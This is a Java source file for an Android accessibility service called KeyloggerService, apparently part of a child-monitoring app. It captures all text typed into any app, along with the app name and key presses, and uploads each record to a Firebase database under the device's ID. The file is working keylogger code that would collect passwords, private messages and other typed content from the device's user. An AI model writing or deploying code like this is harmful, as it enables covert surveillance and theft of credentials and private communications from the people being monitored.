package com.kidsguard.child;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;
import org.json.JSONObject;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class KeyloggerService extends AccessibilityService {
    private static final String TAG = "KeyloggerService";
    private final ExecutorService ioExecutor = Executors.newSingleThreadExecutor();
    private String deviceId;

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        deviceId = LocationService.getSafeDeviceId(this);
        Log.d(TAG, "Accessibility service connected");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            CharSequence text = (event.getText() != null && !event.getText().isEmpty()) ? event.getText().get(0) : "";
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
            
            ioExecutor.execute(() -> {
                try {
                    JSONObject payload = new JSONObject();
                    payload.put("text", text != null ? text.toString() : "");
                    payload.put("app", packageName);
                    payload.put("time", System.currentTimeMillis());
                    
                    FirebaseHelper.put("devices/" + deviceId + "/keystrokes.json", payload.toString());
                } catch (Exception e) {
                    Log.e(TAG, "Keystroke upload failed", e);
                }
            });
        }
    }

    @Override
    protected boolean onKeyEvent(KeyEvent event) {
        if (event == null) {
            Log.w(TAG, "Received null KeyEvent from accessibility framework");
            return false;
        }

        try {
            int keyCode = event.getKeyCode();
            String keyName = KeyEvent.keyCodeToString(keyCode);
            
            if (keyCode != KeyEvent.KEYCODE_UNKNOWN && 
                keyCode != KeyEvent.KEYCODE_BACK && 
                keyCode != KeyEvent.KEYCODE_HOME) {
                
                logKeystroke(keyName, event.getEventTime());
            }
        } catch (Exception e) {
            Log.e(TAG, "Key event processing failed", e);
        }

        return super.onKeyEvent(event);
    }

    private void logKeystroke(String keyName, long timestamp) {
        ioExecutor.execute(() -> {
            try {
                JSONObject payload = new JSONObject();
                payload.put("key", keyName);
                payload.put("time", timestamp > 0 ? timestamp : System.currentTimeMillis());
                FirebaseHelper.put("devices/" + deviceId + "/key_events.json", payload.toString());
            } catch (Exception e) {
                Log.e(TAG, "Keystroke log failed", e);
            }
        });
    }

    @Override
    public void onInterrupt() {
        Log.w(TAG, "Accessibility service interrupted");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        ioExecutor.shutdownNow();
    }
}
